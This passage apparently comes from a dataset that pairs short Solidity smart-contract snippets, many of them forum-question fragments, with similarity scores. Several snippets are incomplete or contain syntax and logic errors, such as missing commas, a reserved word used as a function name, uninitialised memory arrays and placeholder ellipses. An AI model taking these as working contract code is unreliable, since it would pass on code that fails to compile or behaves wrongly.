        ContractWallet _newWallet = new ContractWallet();
        address(_newWallet).transfer(msg.value);
        users[msg.sender] = _newWallet;
    }

}",0.5811738530627305,"contract owned {
    address payable public owner;
    
     constructor () public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address payable newOwner) onlyOwner public {
        owner = newOwner;
    }
}"
"contract Caller{
  function call(address callee_address){
    Callee callee = Callee(callee_address);
    callee.callee_function();
  }
}",0.5671676225645174,"contract DSAuthority {

    

    

    

    function canCall( address caller

                    , address callee

                    , bytes4 sig )

             constant

             returns (bool);

}"
"contract Test 
{
    struct test1 {
        address test;
        address test2;
    }

    struct test2 {
        address test3;
        test1[] test4;
    } 

    function encode (test2[] test)
      external
      returns (bytes32)
    {
         return keccak256(abi.encodePacked(  ??  ));
    }
}",0.5906649462294201,"contract Ambi {
    function getNodeAddress(bytes32) constant returns (address);
    function addNode(bytes32, address) external returns (bool);
    function hasRelation(bytes32, bytes32, address) constant returns (bool);
}"
"contract DebuggerSampleContract{
   int counter = 10;
   constructor(int _input)  public{
      int returnValue;
      for(; _input <counter; _input++)
      {
         returnValue += _input;
       }
       
   }
}",0.5822732707514083,"contract Helloworld {

    string content;

    

    constructor()

    public

    {

        content = 'aaa';

    }

    

    function getContent() constant public returns (string){

        return content;

    }

}"
"contract EtherWorldStorage {
    
    address owner;
    mapping (bytes32 => World) Gameworlds;

    mapping (bytes32 => uint) NamesIndex;
    World[] worldContracts;

    function EtherWorldStorage(){
        owner = msg.sender;
    }


    event WorldCreated(bytes32 indexed worldName, address indexed sender, address result );

    function createWorld(bytes32 name) returns (address a){
        if(NamesIndex[name] > 0x0){
            return 0x0;
        }
        World w = new World(name);
        NamesIndex[name] = worldContracts.length - 1;
        Gameworlds[name] = w;
        WorldCreated(name,msg.sender,w);
        return w;
    }

  function getWorldCount() returns (uint i){
        return worldContracts.length;
    }

    function destroyWorld(bytes32 world){

        World w = Gameworlds[world];
        w.destroy(owner);
    }


function getItemPossessorsInventory(InventoryItem item) returns (address a){
        return item.getOwningInventory();
    }

}",0.5804670320932614,"contract AbstractOrganizationFactory {

    
    event OrganizationCreated(address indexed organization);

    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    
    function owner() public view returns (address);

    
    function create(string calldata orgJsonUri, bytes32 orgJsonHash) external returns (address);

    
    function createAndAddToDirectory(
        string calldata orgJsonUri,
        bytes32 orgJsonHash,
        address directory
    ) external returns (address);

    
    function getCreatedOrganizationsLength() public view returns (uint);

    
    function getCreatedOrganizations() public view returns (address[] memory);

    
    function createdOrganizationsIndex(address organization) public view returns (uint);

    
    function createdOrganizations(uint index) public view returns (address);
}"
"contract MyContract {
  IMyToken token = IMyToken(0x...);
  ...
}",0.5479572475675573,"contract MyContract {

    uint i = (10 + 2) * 2;

}"
"contract VideoDummyData is Ownable{

    
    constructor() public {
        
    }

    
    string[3] m_aryVideoIds = 
        [""ZUSPD9zOyJs"", ""4nqJiBRNQuw"", ""PLcxE4UkJt0""];


    
    function getVideoIdAt (uint ndx) public view returns(string)
    {
        
        require(ndx < m_aryVideoIds.length);

        return m_aryVideoIds[ndx];
    }
}",0.5285858931860002,"contract AdsInterface {

    function advertiseOnBlocks(address, uint16[], string, string, string) external returns (uint) {}

    function canAdvertiseOnBlocks(address, uint16[]) public view returns (bool) {}

    function isAds() public view returns (bool) {}

}"
"contract Hello {
   string public message;
   function HelloWorld() public{
       message = ""Hello, World : This is a Solidity Smart Contract on the Private Ethereum Blockchain "";
   }
}",0.5879606759625409,"contract HelloWorld{
    string input = ""Hello world."";

    function sayHello() view public returns (string) {
        return input;
    }

    function setNewGreeting(string greeting) public {
        input = greeting;
    }
}"
"contract SecondContract{

  FirstContract x = new FirstContract();

function anotherFunction(){
  x.anyFunction(); 
}

}",0.5480338110948086,"contract GameLogicContract {
    
    bool public isGameLogicContract = true;
    
    function GameLogicContract() public {
        
    }
}"
"contract B is A{
    uint b;

    constructor (uint _a, uint _b) public{
        A(_a);
        b = _b;
    }
}",0.5811592775080023,"contract    Token  is  ERC20
{
    using SafeMath  for uint256;

    
    constructor()   public 
    {
    }
    
    
    
}"
"contract con2 {
    function con2(){
    }

    function try(address con1Contract){
        con1 b = con1(con1Contract);
        bytes32[5] y = b.getData();
    }
  ....
}",0.5672217846079579,"contract AbstractENS {
    function owner(bytes32) constant returns(address);
    function resolver(bytes32) constant returns(address);
}"
"contract Bar {

    Foo foo;

    function Bar(address _foo){
        foo = Foo(_foo);
    }

}",0.5764956372164491,"contract Dragon {
    function transfer( address _to, uint256 _amount );
}"
"contract SimpleContract{
   function simple(byte32 toReturn, byte32 otherArg) public returns (byte32){
        
        return toReturn; 
   }
}",0.5945202372909691,"contract Destiny {
    function fight(bytes32 cat1, bytes32 cat2, bytes32 entropy) public returns (bytes32 winner);
}"
"contract A{
   event Invoked(string);
   function A(){
   Invoked(""constructor invoked!"");
   }
 }",0.5426309101567615,"contract Client1 {
    
    
    
    function callback(uint256 id, string response1) external;
}"
"contract HiddenCookies {

    struct Cookie {
        string cookieID
        string name,
        string color,
        string flavor,
        uint amount
    }

    struct CookieJar {
        address[] cookieContributors; 
        mapping(address => Cookie[]) cookies;
        Cookie[] cookieJarContent;
        uint cookiesHiddenForLater;
    }
}",0.5383579608780793,"contract CrowdsaleTokenConstructor is MintableToken {
  string public name;
  string public symbol;
  uint8 public constant decimals = 18;

  constructor(string _name, string _symbol, address _owner) public {
    name = _name;
    symbol = _symbol;
    owner = _owner;
  }
}"
"contract test{
    event Print(string _name, uint _value);
    function test() payable{
        uint testval = 5;
        Print('val',(testval * 1000000000000000000));
        Print('val2',(5 ether));
    }
  }",0.5542003455874385,"contract Debuggable {
    event LogUI(string message, uint256 value);

    function logUI(string message, uint256 value) internal {
        emit LogUI(message, value);
    }
}"
"contract Array{
    using Library for Library.data;
    mapping(address => Library.data) clusterContract;

    function addCluster(address id) returns(bool){
        if(clusterContract[id] == address(0) ){ 
            clusterContract[id] = list;
            return true;
        }
        return false; 
    }
}",0.5541148117914911,"contract DestoryBasic {
    address destoryAddress;
    
    function setDestoryAddress(address _destory) {
        destoryAddress = _destory;
    }
    
    function ifDestory(address from) returns (bool) {
        if (from == destoryAddress) {
            return true;
        }
        return false;
    }
}"
contract TestCoinCrowdsale is Crowdsale {,0.5680100843993153,"contract TestorToken is Ownable {
    

  
}"
"contract Travel {

address private owner;

modifier isOwner
{
    require (owner == msg.sender);
    _;
}

struct TravelStruct 
{
    
    address clientAddress;
    string originAirportName;
    uint32 originTime; 
    uint16 originBagWeight;
    
    uint32 tapeArrivedTime; 
    
    string flyCode;
    uint32 takeOffTime; 
    
    string destinationAirportName;
    uint32 destinyTime; 
    uint16 destinyBagWeight;
}

mapping(uint => TravelStruct) travels;
uint public travelsRegistryCount;

constructor()
{
    owner = msg.sender;
    travelsRegistryCount = 1;
}


function setOrigin (string _originAirportName, uint32 _originTime, uint16 _originBagWeight) public
{
    travels[travelsRegistryCount].clientAddress = owner;
    travels[travelsRegistryCount].originAirportName = _originAirportName;
    travels[travelsRegistryCount].originTime = _originTime;
    travels[travelsRegistryCount].originBagWeight = _originBagWeight;
    travelsRegistryCount++;
}  

function getOrigin (uint _id) isOwner public constant returns (address, string, uint32, uint16)
{
    return (travels[_id].clientAddress, travels[_id].originAirportName ,travels[_id].originTime ,travels[_id].originBagWeight);
}
}",0.5087962862531895,"contract Lescovex_ISC is LescovexERC20 {

    uint256 public contractBalance = 0;

    
    event LogDeposit(address sender, uint amount);
    event LogWithdrawal(address receiver, uint amount);

    address contractAddr = this;

    
    constructor (
        uint256 initialSupply,
        string contractName,
        string tokenSymbol,
        uint256 contractHoldTime,
        address contractOwner

        ) public {
        totalSupply = initialSupply;  
        name = contractName;             
        symbol = tokenSymbol;         
        holdTime = contractHoldTime;
        balances[contractOwner] = totalSupply;

    }

    function () public {

    }

    function deposit() external payable onlyOwner returns(bool success) {
        contractBalance = contractAddr.balance;
        
        emit LogDeposit(msg.sender, msg.value);

        return true;
    }

    function withdrawReward() external {
    
        uint256 ethAmount = (holdedOf(msg.sender) * contractBalance) / totalSupply;

        require(ethAmount > 0);


        
        emit LogWithdrawal(msg.sender, ethAmount);

        delete holded[msg.sender];
        hold(msg.sender,balances[msg.sender]);
        
        msg.sender.transfer(ethAmount);
    }

    function withdraw(uint256 value) external onlyOwner {
        
        msg.sender.transfer(value);
        
        emit LogWithdrawal(msg.sender, value);
    }
}"
"contract A{
    struct N{
        string any;
        uint256[] numberArray;
    }

    N[] public numbers;

    function init(uint256[] _numbers) public{
        for (uint256 i = 0; i < _numbers.length; i++) {
            uint256[] memory arr;
            arr[0] = _numbers[i];
            numbers.push(N(""anything"", arr));
        }
    }
}",0.587764273026303,"contract showNum {
    address owner = msg.sender;
    uint _num = 0;
    constructor(uint number) public {
        _num = number;
    }
    function setNum(uint number) public payable {
        _num = number;
    }
    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract1
{
  abi: [{.....]
 transactionHash: null,
  addRecord: function(),
  allEvents: function(),
  getPatientName: function(),
  getPatientRecord: function(),
  initialize: function(),
  patients: function()
}
> contract1.getPatientRecord(1,1)",0.5141201605896579,"contract EthereumLottery {
    function admin() constant returns (address);
    function needsInitialization() constant returns (bool);
    function initLottery(uint _jackpot, uint _numTickets, uint _ticketPrice);
}"
"contract token {

   struct example2 {
     gas g1; 
     uint256 num;
     ...
     }

}",0.5819040301498317,contract token { mapping (address => uint256) public balanceOf;  }
"contract test2 
{

    address creater;
    string username;
    string password;

    function testusernamepassword(string username,string password) returns (bool) 
    {
        if (username == ""deepak"" && password == ""123"") 
        {
            return true;
        }
        else
        {
            return false;
        }
    }
}",0.5667510678636605,"contract User {

    mapping (bytes32 => bool) public existingNames;

    mapping (address => bytes32) public names;



    function getName(address) external view returns (bytes32) {}

    function setName(address, string) external returns (bytes32) {}

}"
"contract MetaCoin{
 uint A;
}",0.5939018517889476,contract TongCoin is ERC20{}
"contract CA3 {

struct Student {
        uint16 age;
    uint16 income;
    uint16 score;
    uint16 attendance;
}
Student[] public students;

function setStudent (uint16 _age, uint16 _income, uint16 _score, uint16 _attendan
ce) public {
   Student memory tempStudent = Student({age: _age, income: _income, score: _scor
e, attendance: _attendance});
        students.push(tempStudent);

attendance}));


}",0.5659399126220505,"contract IPackFour {

    struct Purchase {
        uint16 current;
        uint16 count;
        address user;
        uint randomness;
        uint64 commit;
    }

    function purchases(uint p) public view returns (
        uint16 current,
        uint16 count,
        address user,
        uint256 randomness,
        uint64 commit
    );

    function predictPacks(uint id) public view returns (uint16[] memory protos, uint16[] memory purities);

}"
"contract Unique {

string fn;
string ln;
bytes20  val;
bytes32 sId;

function identify(string s, string y, bytes32 i)returns (bytes20){
    fn =s;
    ln =y;
    sId =i;
    val = keccak256(sm,bm,vm);
}

function getOut()constant returns (bytes20 ){
    return val;
}
}",0.5862475883713827,"contract Utils {

  function testrc(bytes32 hash, uint8 v, bytes32 r, bytes32 s) public pure returns(address) {

    return ecrecover(hash, v, r, s);

  }



  function hash(uint x, uint y, uint z, uint w) public pure returns(bytes32) {

    return sha3(x,y,z,w);

  }

}"
"contract old{
    struct Student{
        bytes32 name;
        uint age;
    }
    uint public sno = 0;
    mapping (uint => Student) pupil;
    function input(bytes32 n, uint a){
        <Student updated>
    }
    function output() constant returns(bytes32[], uint[], uint){
        bytes32[] memory n = new bytes32[](sno);
        uint[] memory a = new uint[](sno);
        for(uint i=0; i<sno; i++){
            Student s = pupil[i+1];
            n[i] = s.name;
            a[i] = s.age;
        }
        return(n,a,sno);
    }
}",0.5810184259531874,"contract DSPrice is DSThing {

    uint128 public val;
    uint32 public zzz;

    function peek()
        constant
        returns (bytes32,bool)
    {
        return (bytes32(val), now < zzz);
    }

    function read()
        constant
        returns (bytes32)
    {
        assert(now < zzz);
        return bytes32(val);
    }

    function post(uint128 val_, uint32 zzz_, address med_)
        note
        auth
    {
        val = val_;
        zzz = zzz_;
        med_.call(bytes4(sha3(""poke()"")));
    }

    function void()
        note
        auth
    {
        zzz = 0;
    }

}"
"contract ETHTEST {

    uint256 public y;
    address public remMem = 0x4152B21f407Ba23c6118c1641821EC4250DBf3B1;

    function transferETH(uint256 x) public payable returns(uint256){
    
    

        if (x == 1){

            y = x;
            remMem.transfer(24000000000000000000);
            return;
        }

        if (x == 2){

            y = x;
            remMem.transfer(12000000000000000000);
            return;
        }

        if (x == 3){

            y = x;
            remMem.transfer(6000000000000000000);
            return;
        }

        if (x >=4 || x < 0){  
            revert();
            return;
        }

    }

}",0.5318765512643149,"contract SafeMath {



    function safeAdd(uint256 _x, uint256 _y) internal pure returns (uint256) {

        uint256 z = _x + _y;

        assert(z >= _x);

        return z;

    }



    function safeSub(uint256 _x, uint256 _y) internal pure returns (uint256) {

        assert(_x >= _y);

        return _x - _y;

    }



    function safeMul(uint256 _x, uint256 _y) internal pure returns (uint256) {

        uint256 z = _x * _y;

        assert(_x == 0 || z / _x == _y);

        return z;

    }

}"
"contract BBTico is Crowdsale  {

    function BBTico(uint256 startTime, uint256 endTime, uint256 _rate, address _wallet) 
    Crowdsale(now, now + 5*60,  5, 0xB1A9B5564071A442909b17f8e9C7288b44aFC014 , 0xefcfbc96dc2adfe35d3fff6b1d9e985066d618ac) 
    {}


}",0.5940370283727378,"contract HYCCrowdsalePreICO is Crowdsale {
  function HYCCrowdsalePreICO(
    uint256 _startTime,
    uint256 _endTime,
    uint256 _rate,
    address _wallet,
    uint256 _hardCap
  )
    public 
    Crowdsale(_startTime, _endTime, _rate, _wallet, _hardCap)
  {

  }
}"
"contract A {
    using SafeMath for uint256;
    ...
}",0.5338121805204393,"contract CoinI{
    
    uint256 public totalSupply ;
}"
"contract MyContract {

struct FooFighter {  
    bool foo;  
    uint fighters;  
}  
mapping(bytes32 => FooFighter) public fooFighters;  ",0.5349310150190668,"contract ZTHReceivingContract {
    function tokenFallback(address _from, uint _value, bytes _data) public returns (bool);
}"
"contract BasaltStore {
  
  struct documentStore {
    
    uint256 id;
    
    string ipfsHash;
    
    address uploader;
    
    uint dateUploaded;
  }

  
  mapping (uint64 => documentStore) public ListOfDocuments; 
  
  uint256 public documentCount;

  
  function sendDocument(
    string memory _ipfsLocation, 
    uint256 _uploadDate,
    uint64 _key
  ) 
  public
  {
    documentCount ++;
    ListOfDocuments[_key] = documentStore(documentCount, _ipfsLocation, msg.sender, _uploadDate);
  }

  
  function getDocument(
    uint64 _id
  ) 
  public 
  view
  returns (string memory, address, uint256)
  {
    
    string memory ipfsHash = ListOfDocuments[_id].ipfsHash;
    address uploader = ListOfDocuments[_id].uploader;
    uint256 dateUploaded = ListOfDocuments[_id].dateUploaded;
    return (ipfsHash, uploader, dateUploaded);
  }
}",0.5589674616316791,"contract PiggyBank  {

  string public name;

  string public symbol = '%';

  uint8 constant public decimals = 18;

  uint256 constant internal denominator = 10 ** uint256(decimals);

  uint256 internal targetAmount;



  address internal targetAddress;



  constructor(

    string goalName,

    uint256 goalAmount

  ) public

  {

    name = goalName;

    targetAmount = goalAmount;

    targetAddress = msg.sender;

  }



  function balanceOf() view public returns(uint256)

  {

    return 100 * address(this).balance / targetAmount;

  }



  event Transfer(address indexed from, address indexed to, uint256 value);



  function () public payable {

    if (balanceOf() >= 100) {

      selfdestruct(targetAddress);

    }

  }



  function debugDestruct() public {

    selfdestruct(targetAddress);

  }





}"
"contract assignment2{

  event ageread(address,int);
  function getage(address peridentifier) public returns(uint){
    human = mystruct(""adam"",10); 
    ageread(peridentifier,stateintvariable); 
  }
}",0.5374353066669307,"contract SaverExchangeInterface {
    function getBestPrice(uint _amount, address _srcToken, address _destToken, uint _exchangeType) public view returns (address, uint);
}"
"contract Users {

    enum UserType{
        Producer,
        Manufacturer,
        Supplier,
        Retailer,
        Consumer
    }



    UserType constant defaultUserType = UserType.Producer;
    struct User{
        address uad;
        string name;
        string city;
        string country;
        uint tel;
        UserType userType;
    }

    mapping (address => User) users;

function isProducer(address _userAddress) public view returns(bool){
        UserType temp = UserType.Producer;
        if(users[_userAddress].userType == UserType.Producer){
            return true;
        }else{
            return false;
        }

    }



}",0.5563631703929779,"contract UserAuth is AddressRecord {



    event LogSetOwner(address indexed owner);

    address public owner;



    

    modifier auth {

        require(isAuth(msg.sender), ""permission-denied"");

        _;

    }



    

    function setOwner(address nextOwner) public auth {

        RegistryInterface(registry).record(owner, nextOwner);

        owner = nextOwner;

        emit LogSetOwner(nextOwner);

    }



    

    function isAuth(address src) public view returns (bool) {

        if (src == owner) {

            return true;

        } else if (src == address(this)) {

            return true;

        }

        return false;

    }

}"
"contract showBalance{
address owner = 0xca35b7d915458ef540ade6068dfe2f44e8fa733c;
uint256 public showBalance = owner.balance;
}",0.5311742910026999,"contract Token {
    uint256 public totalSupply;
    function balanceOf(address _owner) constant returns (uint256 balance);
}"
"contract Courses {

    struct Instructor {
        uint age;
        string fName;
        string lName;
    }

    mapping (address => Instructor) instructors;
    address[] public instructorAccts;

}",0.5759332066459558,"contract AbstractRegistration {
    
    function getRegistration() public view returns(string, address, string, string, uint, string, string, address[5], uint[5]);
}"
"contract Origin {

struct OriginInfo
{
    string airportName;
    uint32 checkInTime; 
    uint8 bagWeight;
    address clientAddress;
    bool itsHere;
}
mapping (uint256 => OriginInfo) origins;
uint256 public originNonce;

constructor() public
{
    originNonce = 1;
}

function insertOrigin(string _airportName, uint32 _checkInTime, uint8 _bagWeight) 
    external 
{
    origins[originNonce] = OriginInfo(_airportName, _checkInTime, _bagWeight, msg.sender, true);
    originNonce += 1;

    recoverOrigin(originNonce);
}

function recoverOrigin(uint256 _originId) 
    private view 
    returns (string, uint32, uint8, address, bool) 
{
    OriginInfo memory origin = origins[_originId];
    return (
        origin.airportName,
        origin.checkInTime, 
        origin.bagWeight, 
        origin.clientAddress, 
        origin.itsHere
    );
}
}",0.5442621534774343,"contract BasicToken is BasicTokenInterface{
    using SafeMath for uint;
    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    uint public totalSupply;
    mapping (address => uint256) internal balances;
    
    modifier checkpayloadsize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    } 

    function transfer(address _to, uint256 _value) public checkpayloadsize(2*32) returns (bool success) {
        require(balances[msg.sender] >= _value);
        success = true;
        balances[msg.sender] -= _value;

        
        if(_to == address(this)){
            totalSupply = totalSupply.sub(_value);
        }else{
            balances[_to] += _value;
        }
        emit Transfer(msg.sender, _to, _value); 
        return success;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

}"
"contract Travel is Origin{


struct TravelInfo {

    Origin origin;
}

mapping(uint => Travel) travels;
uint public travelsRegistryCount;

function addOrigin (string _airportName, uint32 _checkInTime, uint8 _bagWeight){
    insertOrigin(_airportName, _checkInTime, _bagWeight);

}

}",0.5035448757055699,"contract zHQToken is MintableToken {
    string public constant name = ""zHQ Token"";
    string public constant symbol = ""zHQ"";
    uint256 public decimals = 18;

    
    function transfer(address _to, uint _value) public returns (bool){
        return super.transfer(_to, _value);
    }

}"
"contract foo{
    uint public publicVariable;
    uint notPublic;
}",0.5884390377935453,"contract VoxInterface {
    function par() public returns (uint);
}"
"contract B {
  struct Player {
    uint id;
  } 
  mapping (uint=> Player) Players; 
}",0.5097684359250092,"contract FiatContract
{
    function USD(uint _id) constant returns (uint256);
}"
"contract MetaCoin{
 function createVariableA(){
  
 }
}",0.5960319329103754,"contract CatsCradle {

    

    function cradle() {

        

    }

}"
"contract Appointment{
  enum AppointStatus {
    CREATED,
    CONFIRMED,
    IN_SESSION,
    COMPLETED,
    CANCELLED
  }

address public owner;
uint public id;
string public title;
AppointStatus public status;
uint public timeNow;
uint public timeBookedFor;

constructor(
uint _id,
string _title,
uint _timeNow,
uint _timeBookedFor
) 
public {
    owner = msg.sender; 
    id = _id;
    title = _title;
    doctor = _doctor;
    timeNow = _timeNow;
    status = AppointStatus.CREATED;
    timeBookedFor = _timeBookedFor;
}",0.537349234005276,"contract ERC20Interface
{



    string constant VERSION = ""ERC20 0.2.3-o0ragman0o\nMath 0.0.1\nBase 0.1.1\n"";


    uint public totalSupply;
    uint8 public decimalPlaces;
    string public name;
    string public symbol;
    
    
    
    mapping (address => uint) balance;
    
    
    mapping (address => mapping (address => uint)) public allowance;


    
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value);

    
    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value);





    

    
    

    
    

    
    

    
    

    
    

    
    

    
    

    
    
    
}"
"contract MyContract {
  Person[3] public persons;
  :
  struct Person {...}
}",0.5720344267498796,"contract Contract {
    uint256 public a;
    constructor () public {
        a = 1;
    }
}"
"contract PartProduction {

    struct Production {
        string s1;
        string s2;
        uint256 val1;
    }

    Production public production;

    constructor(
        string s1,
        string s2,
        string val1,
    )public {
        production.s1 = s1;
        production.s2 = s2;
        production.val1 = _val1;
    }
}",0.538267963625404,"contract CrowdsaleTokenConstructor is iToken {

  string public name;

  string public symbol;

  uint8 public constant decimals = 18;



  constructor(string _name, string _symbol, address _owner) public {

    name = _name;

    symbol = _symbol;

    owner = _owner;

  }

}"
"contract DappTokenSale {

    address admin;
    DappToken public tokenContract;

    constructor (DappToken _tokenContract) public {
        admin = msg.sender;
        tokenContract = _tokenContract;

    }   
}",0.5846705956642556,"contract Owned {
    address contractOwner;

    constructor() public { 
        contractOwner = msg.sender; 
    }
    
    function whoIsTheOwner() public view returns(address) {
        return contractOwner;
    }
}"
"contract StorageContract {
    constructor () public {
       userStruct[msg.sender].userId = msg.sender;
       userStruct[msg.sender].userName = 'Jack';
       userStruct[msg.sender].isUser = true;
    }

    mapping(address => User) public userStruct;

    struct User {
        address userId;
        string userName;
        uint userRegistrationDate;
        bool isUser;
    }

    function setNewUser(address _userId, string memory _userName) public returns(address){
        require(userStruct[msg.sender].isUser == true, ""Error (setNewUser)"");
        User storage u = userStruct[_userId];
        u.userName = _userName;
        u.userRegistrationDate = now;
        u.isUser = true;
        return _userId;
    }
}",0.5372506320325261,"contract freedomStatement {

    

    string public statement = ""https:

    mapping (address => bool) public checkconsent;

    event wearehere(string statement);

    uint public signAmounts;

    

    constructor () public {

        emit wearehere(statement);

    }

        

    function isHuman(address addr) internal view returns (bool) {

        uint size;

        assembly { size := extcodesize(addr) }

        return size == 0;

    }



    function () external payable {

        require(isHuman(msg.sender),""no robot"");

        require(msg.value< 0.0000001 ether);

        require(checkconsent[msg.sender] == false,""You have already signed up"");

        checkconsent[msg.sender] = true;

        signAmounts++;

    }



}"
"contract PermissionsTestProxy is Proxy {        
    constructor(address _initialImplementation)
    Proxy(_initialImplementation)
    public
    {   }
}",0.5890290331556726,"contract ImplementationProvider {

  

  function getImplementation(string memory contractName) public view returns (address);

}"
"contract A {
  uint a = 0;   
}",0.5619415088514611,"contract Dai is ERC20 {



}"
"contract ibaVoter {

struct Proposal{
    bytes32 name;
    uint16 voteCount;
}

struct Ballot{
    bytes32 name;
    address chainperson;
    bool blind;
}

Ballot[] public ballots;
uint256 public ballotsNum;
mapping (uint256 => Proposal[]) public proposals;

function startNewBallot(bytes32 ballotName, bool blindParam, bytes32[] proposalNames) external returns (bool success){

    ballots.push(Ballot({
        name: ballotName, 
        chainperson: msg.sender, 
        blind: blindParam
    }));

    ballotsNum++;

    for (uint8 i=0;i<proposalNames.length;i++){
        proposals[ballots.length-1].push(Proposal({name:proposalNames[i], voteCount: 0}));
    }

    return true;
}
}",0.5651867848946018,"contract projectcrypto is StandardToken {

    function () {
        
        throw;
    }

    

    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = &#39;H1.0&#39;;       








    function projectcrypto(
        ) {
        balances[msg.sender] = 1000;               
        totalSupply = 1000;                        
        name = ""Palladium"";                                   
        decimals = 0;                            
        symbol = ""PLMX"";                               
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}"
"contract Demo{
uint numb;

  function setNumb(uint var1){
    numb=var1
  }
}",0.5947070737113646,"contract MNY {
    function mine(address token, uint amount) public;
}"
"contract tokenEvents
{
    event globalEvent(address contractAddress, string eventName, uint value);
    event globalEvent2(address contractAddress, string eventName, uint value, address senderAddress);

    function callEvent(string eventName, uint value)
    {
        globalEvent(msg.sender, eventName, value);
    }

    function callEvent2(string eventName, uint value, address senderAddress)
    {
        globalEvent2(msg.sender, eventName, value, senderAddress);
    }

}",0.5704187197654197,"contract tokenRecipient {
    event receivedEther(address sender, uint amount);
    event receivedTokens(address _from, uint256 _value, address _token, bytes _extraData);

    function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData){
        Token t = Token(_token);
        require(t.transferFrom(_from, this, _value));
        receivedTokens(_from, _value, _token, _extraData);
    }

    function () payable {
        receivedEther(msg.sender, msg.value);
    }
}"
"contract LittleA {
  function() {
    doLittleStuff();

    
  }
}",0.590455955834119,"contract Test {
    
    function die() {
        suicide(0);
    }
}"
"contract HelloWorld{
...
}",0.5933067045090704,"contract HarjCoin{

}"
"contract Remittance is Owned {
    Data.LockBoxes lockBox; 
    Data.LockBoxIndex lockBoxIndex;

    modifier stopInEmergency 
    { 
        if(stopped) throw;
        _; 
    }

    function createLockBox(
        address _receiver,
        bytes32 _password1, 
        bytes32 _password2)   
        stopInEmergency      
        payable
        public 
        returns (bool)
    {
        uint amount = msg.value - ownerFee;         

        
        if(Data.insert(lockBox, lockBoxIndex, _receiver, msg.sender, amount, _password1, _password2))
        {
            LogLockBoxCreated(_receiver, amount, true);
            deposit(owner, ownerFee);            
            return true;
        } 
        else 
        {
            LogLockBoxCreated(_receiver, amount, false);
            throw;
        }
    }    ",0.5338393790421732,"contract TokenInterface is ErrorHandler {
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    uint256 public tokensCreated;

    function balanceOf(address _owner) constant returns (uint256 balance);
    function transfer(address _to, uint256 _amount) returns (bool success);

    event evTransfer(address msg_sender, uint msg_value, address indexed _from, address indexed _to, uint256 _amount);

    
    modifier onlyTokenHolders {
        if (balanceOf(msg.sender) == 0) doThrow(""onlyTokenHolders""); else {_}
    }
}"
"contract A{

    mapping (uint=>Storage) idToStorage;

    function addNewB(uint id){
         Storage storage=new Storage();
         idToStorage[id]=storage;
    }

    function getStatus(uint id){
         idToStorage[id].status();
    }
}",0.5279092996756645,"contract InitializableStorageAdapter is StorageAdapter {

    function _initStorageAdapter(Storage _storage, bytes32 _crate) internal {
        require(address(store.store) == 0x0);
        store.init(_storage, _crate);
    }
}"
"contract delegateReceiever{
uint public testInt;

function delegateReceiever(){
    testInt = 2;
}

function setTestInt(uint _testInt){
    testInt = _testInt;
}
}",0.5757436084253574,"contract token { function transfer(address receiver, uint amount) public ;
                 function mintToken(address target, uint mintedAmount) public ;
                }"
"contract ActivityInterface{
    address CongressAddress = 0x1;
    Congress temp = Congress(CongressAddress);
    mapping (address => uint) stakeholderId = temp.stakeholderId;
}",0.5151992333648867,"contract ZethrBankroll {

    address public stakeAddress;

    mapping (address => bool) public isOwner;

    function changeAllocation(address what, int delta) public;

}"
contract CustList { uint x;},0.5374874621204928,"contract Asset is ATxAsset {

}"
"contract A is B {
  I objectSample;
  ...
}",0.5920413179164857,"contract A {

    B public myB = new B();

}"
"contract DormantAssetFactory {
  
  address[] public dormantAssets;
  uint256 public _heartbeatTimeout =1000000;
  function getContractCount()     public    constant    returns(uint contractCount)
  {
    return dormantAssets.length;
  }
  
  function newDormantAsset()    public     returns(address _newDormantAssetContract)
  {
    DormantAsset c = new DormantAsset(_heartbeatTimeout);
    dormantAssets.push(c);
    return c;
  }",0.5523243243090814,"contract IBadBitDistributor{
	function sendTokens(address _user, uint _amount) public;
	function getStandardLot() public view returns(uint);
	function shouldWinTokens(address _contract, bytes32 _hash, address _user, uint[] memory _betSizes, uint[] memory _chances, uint _maxNumOfBets) public view returns (bool);
	function winTokens(address _user) public;

}"
"contract Group {
    struct Person {
        uint age;
        bytes32 name;
    }
    mapping (address => Person) members;
}",0.5792658920282379,"contract SpotLike {
    function ilks(bytes32 ilk) public view returns (address pip, uint mat);
}"
"contract RockBand {
    struct Musician {
        uint age;
        bytes32 name;
        bytes32 instrument;
    }
    mapping (address => Musician) members;
}",0.5796322860689945,"contract SmartolutionInterface {

    struct User {

        uint value;

        uint index;

        uint atBlock;

    }



    mapping (address => User) public users; 

}"
"contract FootballClub {
    struct Player {
        uint age;
        bytes32 name;
        bytes32 position;
    }
    mapping (address => Player) members;
}",0.586103214112119,"contract KernelStorage {
    
    mapping (bytes32 => mapping (bytes32 => address)) public apps;
    bytes32 public recoveryVaultAppId;
}"
"contract PlanetEarthContract {
    string[7] continents;
    constructor() public {
        continents = [""North America"", ""South America"", ""Europe"", 
        ""Asia"", ""Oceania"", ""Antartica"", ""Africa""];}

        function getCountries() public view returns(string[7] memory){
        return(continents);
    }

}",0.54453749938357,"contract Trusti {
    string public data = ""trusti.id"";
    
    function getData() public view returns (string memory) {
        return data;
    }
    
    function setData(string memory _dataHash, string memory _dataSignee) public {
        data = _dataHash;
        data = _dataSignee;
    }
}"
"contract Getter is Getter_check {
    function getval() constant returns(uint getter_value, uint r)
    {
        var obj = new Getter_check();
        getter_value = obj.data();
        r = obj.f();
    }
}",0.5900291240706645,"contract token {
    function balanceOf( address who ) constant returns (uint value);
    function transfer( address to, uint value) returns (bool ok);
}"
"contract TestArray {
    uint[] public newOriginal;

    function TestArray(){
    }

    function copy(){
        for(uint i = 1; i<5; i++){
            newOriginal[i]=2;
